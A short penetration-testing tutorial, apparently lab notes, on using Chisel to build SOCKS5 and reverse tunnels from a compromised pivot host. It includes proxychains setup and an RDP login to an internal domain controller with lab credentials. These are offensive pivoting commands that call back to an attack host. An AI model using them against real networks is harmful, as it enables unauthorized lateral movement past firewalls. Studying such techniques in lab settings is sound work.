---
description: >-
  a TCP/UDP-based tunneling tool written in Go that uses HTTP to transport data
  that is secured using SSH
---

# SOCKS5 Tunneling with Chisel

`Chisel` can create a client-server tunnel connection in a firewall restricted environment.

## Chisel Setup

**Transferring Chisel Binary to Pivot Host**

```shell-session
scp chisel ubuntu@10.129.202.64:~/
```

**Running the Chisel Server on the Pivot Host**

```shell-session
ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5
```

* Listen ot incomming connections on port `1234`
* \--socks5 specify to use `SOCKS5`

**Connecting to the Chisel Server**

```shell-session
./chisel client -v 10.129.202.64:1234 socks

2022/05/05 14:21:18 client: Connecting to ws://10.129.202.64:1234
2022/05/05 14:21:18 client: tun: proxy#127.0.0.1:1080=>socks: Listening
2022/05/05 14:21:18 client: tun: Bound proxies
2022/05/05 14:21:19 client: Handshaking...
2022/05/05 14:21:19 client: Sending config
2022/05/05 14:21:19 client: Connected (Latency 120.170822ms)
2022/05/05 14:21:19 client: tun: SSH connected
```

Modify our proxychains.conf file located at `/etc/proxychains.conf` and add `1080` to use proxychains to pivot using the tunnel between port 1080 and SSH tunnel.

**Editing proxychains.conf**

```shell-session
tail -n3 /etc/proxychains.conf

# defaults set to "tor"
# socks4 	127.0.0.1 9050
socks5 127.0.0.1 1080
```

Now we can use service like RDP to connect to the host in the internal network using proxychains through tunnel.

**Pivoting to the DC**

```shell-session
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

## Chisel Reverse Setup

There might be some scenario where the firewall restricts any inbound connection to the compromised/foothold target. We can use --reverse flag to run the server on the attack host instead and the foothold target runs chisel with R:socks.

**Starting the Chisel Server on our Attack Host**

```shell-session
sudo ./chisel server --reverse -v -p 1234 --socks5
```

**Connecting the Chisel Client to our Attack Host**

```shell-session
./chisel client -v 10.10.14.17:1234 R:socks
```

**Editing & Confirming proxychains.conf**

```shell-session
tail -f /etc/proxychains4.conf 

[ProxyList]
# add proxy here ...
# socks4    127.0.0.1 9050
socks5 127.0.0.1 1080 
```

if you get the following error:

```
./chisel: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.32' not found (required by ./chisel)
./chisel: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./chisel)
```

Then try to build chisel with static library.

```go
go build --ldflags '-linkmode external -extldflags "-static"'
```

